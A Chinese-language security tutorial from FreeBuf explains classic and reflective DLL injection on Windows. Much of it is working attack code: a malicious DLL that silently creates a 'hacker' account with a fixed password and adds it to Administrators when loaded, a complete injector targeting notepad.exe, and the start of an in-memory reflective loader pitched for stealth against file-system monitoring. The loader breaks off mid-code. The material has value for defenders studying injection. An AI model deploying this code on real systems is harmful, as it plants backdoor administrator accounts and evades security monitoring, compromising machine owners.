---
title: 反射DLL注入技术深度解析与实战
url: https://www.freebuf.com/articles/endpoint/422011.html
source: FreeBuf网络安全行业门户
date: 2025-02-18
fetch_date: 2025-10-06T20:39:22.280722
---

# 反射DLL注入技术深度解析与实战

[![freeBuf](/images/logoMax.png)](/)

主站

分类

云安全

AI安全

开发安全

终端安全

数据安全

Web安全

基础安全

企业安全

关基安全

移动安全

系统安全

其他安全

特色

热点

工具

漏洞

人物志

活动

安全招聘

攻防演练

政策法规

[报告](https://www.freebuf.com/report)[专辑](/column)

* ···
* [公开课](https://live.freebuf.com)
* ···
* [商城](https://shop.freebuf.com)
* ···
* 用户服务
* ···

行业服务

政 府

CNCERT
CNNVD

会员体系（甲方）
会员体系（厂商）
产品名录
企业空间

[知识大陆](https://wiki.freebuf.com/page)

搜索

![](/freebuf/img/7aa3bf7.svg) ![](/freebuf/img/181d733.svg)

创作中心

[登录](https://www.freebuf.com/oauth)[注册](https://www.freebuf.com/oauth)

官方公众号企业安全新浪微博

![](/images/gzh_code.jpg)

FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](/images/xcx-code.jpg)

FreeBuf+小程序把安全装进口袋

[![](https://image.3001.net/images/20231020/1697804527_653270ef7570cc7356ba8.png)](https://wiki.freebuf.com)

反射DLL注入技术深度解析与实战

* ![]()
* 关注

* [终端安全](https://www.freebuf.com/articles/endpoint)

反射DLL注入技术深度解析与实战

2025-02-17 17:44:34

所属地 广东省

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
本文由
创作，已纳入「FreeBuf原创奖励计划」，未授权禁止转载

## 一、DLL注入技术基础

### 1.1 普通DLL注入原理

普通DLL注入通过操作目标进程内存空间，强制加载外部DLL文件。核心流程如下：

1. **获取目标进程句柄**：`OpenProcess`
2. **分配内存写入DLL路径**：`VirtualAllocEx`+ `WriteProcessMemory`
3. **创建远程线程执行加载**：`CreateRemoteThread`调用`LoadLibrary`
4. **清理资源**：释放内存并关闭句柄

**技术局限**：

* 依赖`LoadLibrary`等敏感API
* 需要磁盘DLL文件落地
* 容易被行为分析检测

---

## 二、普通DLL注入实战：添加系统用户

### 2.1 恶意DLL代码实现

> #include <Windows.h>
> #include <Lm.h>
> #include <iostream>
> #pragma comment(lib,"netapi32")
> #include  <stdio.h>
>
> void ExecutePayload() {
> // 添加用户
> USER\_INFO\_1 ui;
> ui.usri1\_name = L"hacker";
> ui.usri1\_password = L"P@ssw0rd123!";
> ui.usri1\_priv = USER\_PRIV\_USER;
> ui.usri1\_flags = UF\_SCRIPT;
>
> DWORD dwError;
> NET\_API\_STATUS nStatus = NetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError);
>
> if (nStatus == NERR\_Success) {
> // 添加到管理员组
> LOCALGROUP\_MEMBERS\_INFO\_3 account;
> account.lgrmi3\_domainandname = L"hacker";
> nStatus = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);
> if (nStatus == NERR\_Success) {
> std::wcout << L"用户添加并已加入管理员组成功!" << std::endl;
> } else {
> DWORD dwErr = GetLastError();
> std::wcout << L"添加到管理员组失败, 错误代码: " << dwErr << std::endl;
> }
> } else {
> DWORD dwErr = GetLastError();
> std::wcout << L"添加用户失败, 错误代码: " << dwErr << std::endl;
> }
> }
>
> BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul\_reason\_for\_call, LPVOID lpReserved) {
> if (ul\_reason\_for\_call == DLL\_PROCESS\_ATTACH) {
> // 执行payload
> ExecutePayload();
> }
> return TRUE;
> }

#### 代码解析：

* **`NetUserAdd`**：Windows API函数，用于创建新用户
* **`NetLocalGroupAddMembers`**：将用户添加到指定本地组
* **`DllMain`入口点**：在DLL加载时触发恶意代码

---

### 2.2 注入器实现

这里要注意的一个问题，某些目标进程（如浏览器）可能具有更严格的沙箱机制或安全限制，阻止外部进程进行 DLL 注入或操作系统级别的更改。在这种情况下，即便你成功注入 DLL，它也可能无法执行特定操作，所以选的是notepad.exe进行注入

> #include <Windows.h>
> #include <TlHelp32.h>
> #include <iostream>
>
> DWORD FindTargetProcess(LPCWSTR procName) {
> PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
> HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS\_SNAPPROCESS, 0);
>
> if (Process32First(hSnapshot, &pe)) {
> do {
> if (\_wcsicmp(pe.szExeFile, procName) == 0) {
> CloseHandle(hSnapshot);
> return pe.th32ProcessID;
> }
> } while (Process32Next(hSnapshot, &pe));
> }
> CloseHandle(hSnapshot);
> return 0;
> }
>
> bool InjectDLL(DWORD pid, LPCWSTR dllPath) {
> HANDLE hProcess = OpenProcess(PROCESS\_ALL\_ACCESS, FALSE, pid);
> if (!hProcess) return false;
>
> size\_t pathSize = (wcslen(dllPath) + 1) \* sizeof(WCHAR);
>
> LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, pathSize, MEM\_COMMIT, PAGE\_READWRITE);
> if (!remoteMem) {
> CloseHandle(hProcess);
> return false;
> }
>
> if (!WriteProcessMemory(hProcess, remoteMem, dllPath, pathSize, NULL)) {
> VirtualFreeEx(hProcess, remoteMem, 0, MEM\_RELEASE);
> CloseHandle(hProcess);
> return false;
> }
>
> LPVOID loadLibAddr = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
>
> HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
> (LPTHREAD\_START\_ROUTINE)loadLibAddr, remoteMem, 0, NULL);
>
> if (!hThread) {
> VirtualFreeEx(hProcess, remoteMem, 0, MEM\_RELEASE);
> CloseHandle(hProcess);
> return false;
> }
>
> WaitForSingleObject(hThread, INFINITE);
>
> VirtualFreeEx(hProcess, remoteMem, 0, MEM\_RELEASE);
> CloseHandle(hThread);
> CloseHandle(hProcess);
> return true;
> }
>
> int main() {
> DWORD pid = FindTargetProcess(L"notepad.exe");
> if (pid == 0) {
> std::cerr << "目标进程未找到" << std::endl;
> return 1;
> }
>
> if (InjectDLL(pid, L"C:\\Users\\user\\Desktop\\test\\adduser.dll")) {
> std::cout << "注入成功!" << std::endl;
> }
> else {
> std::cerr << "注入失败! 错误代码: " << GetLastError() << std::endl;
> }
>
> return 0;
> }

#### 运行效果：

1. 注入notepad.exe进程
2. 创建用户`hacker`并设置密码
3. 将用户添加到`Administrators`组
4. 验证命令：`net user hacker`

![1739774264_67b2d9380f86cb7f86521.png!small?1739774263730](https://image.3001.net/images/20250217/1739774264_67b2d9380f86cb7f86521.png!small?1739774263730)

## 三、反射DLL注入技术

### 3.1 反射DLL注入原理

###

1. **DLL 加载到内存中**：

   * 反射 DLL 注入会将 DLL 文件直接加载到内存中（通过读取 DLL 文件的字节流），并将其内容复制到进程的地址空间。
2. **没有文件写入磁盘**：

   * 在反射 DLL 注入的过程中，DLL 的字节数据只在内存中存在，不会写入磁盘。所以，DLL 文件不会在目标系统的文件系统中留下任何痕迹。
3. **内存中执行**：

   * DLL 的执行是通过在内存中手动触发 DLL 的入口点（如 `DllMain`）来完成的，不会通过操作系统的 `LoadLibrary`API，因此不需要将 DLL 文件“落地”到硬盘。

### 3.2对比传统的 DLL 注入

* **传统 DLL 注入**：通常会使用`CreateRemoteThread`和`VirtualAllocEx`等方法将 DLL 文件复制到目标进程的内存中，并执行它。这种方法可能会涉及将 DLL 文件保存到目标进程的虚拟内存中或直接调用系统的`LoadLibrary`函数。如果是基于文件的 DLL 注入，那么通常需要将 DLL 文件写入磁盘，这就可能留下文件痕迹。
* **反射 DLL 注入**：通过手动解析 PE 文件格式并将 DLL 加载到内存中，避免了将 DLL 文件写入硬盘。此方法只在内存中存在 DLL，因此不会有文件被保存到硬盘上。

### 3.3 反射 DLL 注入的优势

* **隐蔽性强**：由于 DLL 文件不需要写入磁盘，反射 DLL 注入技术比传统的 DLL 注入方式更加隐蔽，难以通过文件系统的扫描来发现。
* **绕过文件系统监控**：一些安全软件可能会检测 DLL 文件的创建、修改或删除，而反射 DLL 注入完全避免了这些操作，减少了被检测的风险。

### 3.4 反射 DLL 注入的限制：

尽管反射 DLL 注入在某些情况下具有较强的隐蔽性，但它也有一些潜在的挑战：

1. **内存消耗**：将 DLL 文件加载到内存中会占用进程的内存空间。
2. **复杂性**：手动解析 PE 文件并执行入口函数的过程比传统的 API 调用要复杂，需要更多的低级编程技巧。
3. **安全性**：反射 DLL 注入通常是绕过标准加载机制的技术，如果用于恶意目的，可能会引起法律和道德问题。

示例代码

> #include <Windows.h>
> #include <iostream>
> #include <vector>
> #include <string>
>
> // 这是一个示例字节数组，代表你的 DLL 文件的内容。
> // 在实际应用中，这个字节数组应该包含 DLL 文件的实际字节流。
> // 可以通过工具（比如 xxd 或 Python）将 DLL 转换为字节数组。
> const unsigned char reflectiveDll[] = {
> 0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
> 0xFF, 0xFF, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
> // 这里省略了大量字节，实际上你会有一个完整的 DLL 文件字节流
> 0x00, 0x00 // DLL 结束标志（仅为示例）
> };
>
> // 手动解析 PE 文件并获取函数地址
> void\* GetProcAddressManual(HMODULE hModule, const char\* functionName) {
> PIMAGE\_DOS\_HEADER dosHeader = (PIMAGE\_DOS\_HEADER)hModule;
> PIMAGE\_NT\_HEADERS ntHeaders = (PIMAGE\_NT\_HEADERS)((BYTE\*)hModule + dosHeader->e\_lfanew);
>
> // 获取导出表
> PIMAGE\_EXPORT\_DIRECTORY exportDirectory = (PIMAGE\_EXPORT\_DIRECTORY)((BYTE\*)hModule + ntHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
> DWORD\* addressOfFunctions = (DWORD\*)((BYTE\*)hModule + exportDirectory->AddressOfFunctions);
> DWORD\* addressOfNames = (DWORD\*)((BYTE\*)hModule + exportDirectory->AddressOfNames);
> WORD\* addressOfOrdinals = (WORD\*)((BYTE\*)hModule + exportDirectory->AddressOfNameOrdinals);
>
> for (DWORD i = 0; i < exportDirectory->NumberOfNames; ++i) {
> const char\* funcName = (const char\*)((BYTE\*)hModule + addressOfNames[i]);
> if (strcmp(funcName, functionName) == 0) {
> WORD ordinal = addressOfOrdinals[i];
> DWORD functionRVA = addressOfFunctions[ordinal];
> return (void\*)((BYTE\*)hModule + functionRVA);
> }
> }
> return nullptr;
> }
>
> // 加载 DLL 到内存
> LPVOID LoadDllInMemory(const unsigned char\* dllData, size\_t dllSize) {
> // 分配内存空间
> LPVOID pDllBase = VirtualAlloc(NULL, dllSize, MEM\_COMMIT | MEM\_RESERVE, PAGE\_EXECUTE\_READWRITE);
> if (!pDllBase) {
> std::cerr << "无法分配内存" << std::endl;
> return nullptr;
> }
>
> // 将 DLL 数据写入到内存
> memcpy(pDllBase, dllData, dllSize);
>
> // 获取该 DLL 的入口地址
> PIMAGE\_DOS\_HEADER dosHeader = (PIMAGE\_DOS\_HEADER)pDllBase;
> PIMAGE\_NT\_HEADERS ntHeaders = (PIMAGE\_NT\_HEADERS)((BYTE\*)pDl...